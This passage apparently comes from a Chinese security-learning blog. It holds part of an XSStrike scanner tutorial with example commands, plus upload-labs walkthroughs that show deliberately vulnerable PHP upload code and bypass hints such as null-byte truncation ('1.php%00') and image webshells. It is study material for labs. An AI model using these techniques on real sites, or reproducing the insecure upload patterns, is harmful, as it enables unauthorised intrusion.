-<p>python xsstrike.py -u “<a href="http://example.com/search/form/query">http://example.com/search/form/query</a>“ –path</p>
-</blockquote>
-<h3 id="将-POST-数据视为-JSON"><a href="#将-POST-数据视为-JSON" class="headerlink" title="将 POST 数据视为 JSON"></a>将 POST 数据视为 JSON</h3><p>选项：–json</p>
-<p>该开关可用于通过 POST 方法测试 JSON 数据</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php">http://example.com/search.php</a>“ –data ‘{“q”:”query”}’ –json</p>
-</blockquote>
-<h3 id="爬行"><a href="#爬行" class="headerlink" title="爬行"></a>爬行</h3><p>选项：–crawl</p>
-<p>从目标网页开始抓取目标并进行测试</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl</p>
-</blockquote>
-<p><img src="/.com//image-20250520022958-fyivqpz.png" alt="image"></p>
-<h3 id="爬行深度"><a href="#爬行深度" class="headerlink" title="爬行深度"></a>爬行深度</h3><p>选项：-l（默认为 2）</p>
-<p>此选项允许您指定爬网的深度</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php">http://example.com/page.php</a>“ –crawl -l 3</p>
-</blockquote>
-<h3 id="从文件中测试-抓取-URL"><a href="#从文件中测试-抓取-URL" class="headerlink" title="从文件中测试&#x2F;抓取 URL"></a>从文件中测试&#x2F;抓取 URL</h3><p>选项：–seeds</p>
-<blockquote>
-<p>python xsstrike.py –seeds urls.txt</p>
-<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -l 3 –seeds urls.txt</p>
-</blockquote>
-<h3 id="从文件中暴力破解有效负载"><a href="#从文件中暴力破解有效负载" class="headerlink" title="从文件中暴力破解有效负载"></a>从文件中暴力破解有效负载</h3><p>选项：-f</p>
-<p>您可以从文件加载有效负载并检查它们是否有效</p>
-<blockquote>
-<p>python3 xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -f &#x2F;path&#x2F;to&#x2F;file.txt</p>
-</blockquote>
-<h3 id="线程数"><a href="#线程数" class="headerlink" title="线程数"></a>线程数</h3><p>选项：-t</p>
-<p>在爬行时可以向目标发出并发请求，并且-t可以使用选项来指定要发出的并发请求的数量。虽然线程可以帮助加快爬行速度，但它们也可能会触发安全机制。大量线程也会导致小型网站瘫痪</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/">http://example.com</a>“ -t 10 –crawl -l 3</p>
-</blockquote>
-<h3 id="暂停"><a href="#暂停" class="headerlink" title="暂停"></a>暂停</h3><p>选项：–timeout（默认为 7）</p>
-<p>可以指定在考虑 HTTP(S) 请求超时之前等待的秒数</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ –timeout=4</p>
-</blockquote>
-<h3 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h3><p>选项：-d</p>
-<p>可以指定每个 HTTP(S) 请求之间保持的秒数。有效值为 int，例如 1 表示秒</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -d 2</p>
-</blockquote>
-<h3 id="提供-HTTP-标头"><a href="#提供-HTTP-标头" class="headerlink" title="提供 HTTP 标头"></a>提供 HTTP 标头</h3><p>选项：–headers</p>
-<p>简单地从命令行添加标头，并用 \n 以下分隔符分隔</p>
-<blockquote>
-<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –headers “Accept-Language: en-US\nCookie: null”</p>
-</blockquote>
-<h3 id="盲目跨站"><a href="#盲目跨站" class="headerlink" title="盲目跨站"></a>盲目跨站</h3><p>选项：–blind</p>
-<p>在爬行时使用此选项将使 XSStrike 注入您定义的盲 XSS 有效负载 <code>core/config.py</code>​，以将其注入到每个 HTML 表单的每个参数中</p>
-<blockquote>
-<p>python xsstrike.py -u <a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a> –crawl –blind</p>
-</blockquote>
-<h3 id="有效负载编码"><a href="#有效负载编码" class="headerlink" title="有效负载编码"></a>有效负载编码</h3><p>选项：-e</p>
-<p>XSStrike 可以按需对有效负载进行编码。目前支持 base64 编码</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/page.php?q%5C=query">http://example.com/page.php?q\=query</a>“ -e base64</p>
-</blockquote>
-<h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>选项：–fuzzer</p>
-<p>模糊器旨在测试过滤器和 Web 应用程序防火墙。它非常慢，因为它随机发送*延迟请求，并且延迟可能长达 30 秒。要最小化延迟，请使用<code>-d</code>​选项将延迟设置为 1 秒</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –fuzzer</p>
-</blockquote>
-<h3 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h3><p>选项： –proxy（默认 0.0.0.0:8080）</p>
-<p>您必须设置您的代理（y|ies）core&#x2F;config.py，然后您可以–proxy随时使用开关来使用它们</p>
-<h3 id="跳过确认提示"><a href="#跳过确认提示" class="headerlink" title="跳过确认提示"></a>跳过确认提示</h3><p>选项：–skip</p>
-<p>如果您希望 XSStrike 在找到工作负载时继续扫描而不询问您是否要继续扫描，那么您可以使用此选项。它还会跳过 POC 生成</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip</p>
-</blockquote>
-<h3 id="跳过-DOM-扫描"><a href="#跳过-DOM-扫描" class="headerlink" title="跳过 DOM 扫描"></a>跳过 DOM 扫描</h3><p>选项：–skip-dom</p>
-<p>您可能希望在爬行时跳过 DOM XSS 扫描以节省时间</p>
-<blockquote>
-<p>python xsstrike.py -u “<a href="http://example.com/search.php?q%5C=query">http://example.com/search.php?q\=query</a>“ –skip-dom</p>
-</blockquote>
-<p><img src="/.com//image-20250520023134-ibwla1x.png" alt="image"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" data-id="cmaxygi14002loc7k3rem6oz1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/%00截断" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>都表示为空,加了这个空字符的话，会将后面的字符截断不显示</p>
-<p> <strong>%00:在url中</strong></p>
-<p><strong>0x00:在编程语言中</strong></p>
-</blockquote>
-<blockquote>
-<p>这一关用的是白名单过滤</p>
-<p>​<kbd>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</kbd>​:获取提交的文件名</p>
-<p>​<kbd>strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)</kbd>​搜寻”.”首次出现的是在第几位，然后我们加1</p>
-<p>​<kbd>substr</kbd>​:获取字符串的子集,这里获取的是”.”后面的</p>
-</blockquote>
-<p>在实际路径直接加1.php%00</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%00%E6%88%AA%E6%96%AD/" data-id="cmaxygi15002moc7kf2q58es6" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/0X00截断" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这个是一个POST请求，上一关是GET请求,它的实际路径变到下面去了,要注意一下</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/0X00%E6%88%AA%E6%96%AD/" data-id="cmaxygi15002ooc7kgsv1ff0q" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Pass-20" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" data-id="cmaxygi15002poc7k8wtad7t7" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Pass-15" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = <span class="title function_ invoke__">exif_imagetype</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>由于判定其实是上一关是差不多的，所以还是上传一个图片马即可</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-15/" data-id="cmaxygi16002qoc7k084y1j3a" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/Pass-21" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名,是否为空，是空就用文件名字</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;<span class="comment">//通过‘.’分割勒，就不能用. .绕过，‘.’拿来分割成一个数组</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);<span class="comment">//file是个数组，ext后缀是取最后一个值再判断是不是在白名单</span></span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title 